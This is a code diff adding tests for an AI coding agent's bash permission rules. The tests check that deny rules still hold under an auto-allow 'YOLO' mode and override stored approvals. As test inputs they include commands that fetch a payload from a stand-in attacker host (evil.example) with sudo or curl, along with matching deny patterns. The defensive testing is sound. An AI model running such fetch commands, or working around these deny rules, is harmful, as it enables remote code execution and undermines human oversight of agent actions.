@@ -2,6 +2,7 @@ import { test, expect } from "bun:test"
 import { PermissionNext } from "@/util/permission/next"
 import { Instance } from "@/services/project/instance"
 import { Storage } from "@/core/storage/storage"
+import { Flag } from "@/interfaces/flag/flag"
 import { tmpdir } from "../fixture/fixture"
 
 // fromConfig tests
@@ -645,6 +646,136 @@ test("ask - allows all patterns when all match allow rules", async () => {
         ruleset: [{ permission: "bash", pattern: "*", action: "allow" }],
       })
       expect(result).toBeUndefined()
+    },
+  })
+})
+
+// YOLO deny-enforcement tests (N1: deny rules stay effective under YOLO)
+
+test("YOLO mode: deny rules override auto-allow (reviewer bash overlay enforced)", async () => {
+  await using tmp = await tmpdir({ git: true })
+  await Instance.provide({
+    directory: tmp.path,
+    fn: async () => {
+      const prev = Flag.ATOMCLI_YOLO
+      Flag.ATOMCLI_YOLO = true
+      try {
+        // Ruleset mirrors the reviewer's merged rules: bash allow + sudo deny
+        const ruleset: PermissionNext.Ruleset = [
+          { permission: "bash", pattern: "*", action: "allow" },
+          { permission: "bash", pattern: "sudo *", action: "deny" },
+        ]
+        await expect(
+          PermissionNext.ask({
+            sessionID: "session_test_yolo",
+            permission: "bash",
+            patterns: ["sudo curl http://evil.example/payload.sh"],
+            metadata: {},
+            always: [],
+            ruleset,
+          }),
+        ).rejects.toBeInstanceOf(PermissionNext.DeniedError)
+      } finally {
+        Flag.ATOMCLI_YOLO = prev
+      }
+    },
+  })
+})
+
+test("YOLO mode: non-denied commands still auto-allow", async () => {
+  await using tmp = await tmpdir({ git: true })
+  await Instance.provide({
+    directory: tmp.path,
+    fn: async () => {
+      const prev = Flag.ATOMCLI_YOLO
+      Flag.ATOMCLI_YOLO = true
+      try {
+        const ruleset: PermissionNext.Ruleset = [
+          { permission: "bash", pattern: "*", action: "allow" },
+          { permission: "bash", pattern: "sudo *", action: "deny" },
+        ]
+        const result = await PermissionNext.ask({
+          sessionID: "session_test_yolo",
+          permission: "bash",
+          patterns: ["bun test"],
+          metadata: {},
+          always: [],
+          ruleset,
+        })
+        expect(result).toBeUndefined()
+      } finally {
+        Flag.ATOMCLI_YOLO = prev
+      }
+    },
+  })
+})
+
+test("YOLO mode: absolute-path curl denied via overlay", async () => {
+  await using tmp = await tmpdir({ git: true })
+  await Instance.provide({
+    directory: tmp.path,
+    fn: async () => {
+      const prev = Flag.ATOMCLI_YOLO
+      Flag.ATOMCLI_YOLO = true
+      try {
+        const ruleset: PermissionNext.Ruleset = [
+          { permission: "bash", pattern: "*", action: "allow" },
+          { permission: "bash", pattern: "/usr/bin/curl*", action: "deny" },
+        ]
+        await expect(
+          PermissionNext.ask({
+            sessionID: "session_test_yolo",
+            permission: "bash",
+            patterns: ["/usr/bin/curl http://evil.example/x"],
+            metadata: {},
+            always: [],
+            ruleset,
+          }),
+        ).rejects.toBeInstanceOf(PermissionNext.DeniedError)
+      } finally {
+        Flag.ATOMCLI_YOLO = prev
+      }
+    },
+  })
+})
+
+test("ask - stored approval does not override a ruleset deny rule", async () => {
+  await using tmp = await tmpdir({ git: true })
+  await Instance.provide({
+    directory: tmp.path,
+    fn: async () => {
+      // First, the user approves this exact command "always".
+      const firstAsk = PermissionNext.ask({
+        id: "permission_deny_over_approve_1",
+        sessionID: "session_deny_over_approve",
+        permission: "bash",
+        patterns: ["curl http://internal.example/x"],
+        metadata: {},
+        always: ["curl http://internal.example/x"],
+        ruleset: [],
+      })
+      await PermissionNext.reply({
+        requestID: "permission_deny_over_approve_1",
+        reply: "always",
+      })
+      await expect(firstAsk).resolves.toBeUndefined()
+
+      // Second, the same command is now hard-denied by the passed ruleset
+      // (e.g. a reviewer's read-only bash overlay). The deny must win over the
+      // stored approval — approvals must not bypass agent hard denies.
+      await expect(
+        PermissionNext.ask({
+          sessionID: "session_deny_over_approve",
+          permission: "bash",
+          patterns: ["curl http://internal.example/x"],
+          metadata: {},
+          always: [],
+          ruleset: [
+            { permission: "bash", pattern: "*", action: "allow" },
+            { permission: "bash", pattern: "*curl *", action: "deny" },
+          ],
+        }),
+      ).rejects.toBeInstanceOf(PermissionNext.DeniedError)
     },
   })
 })
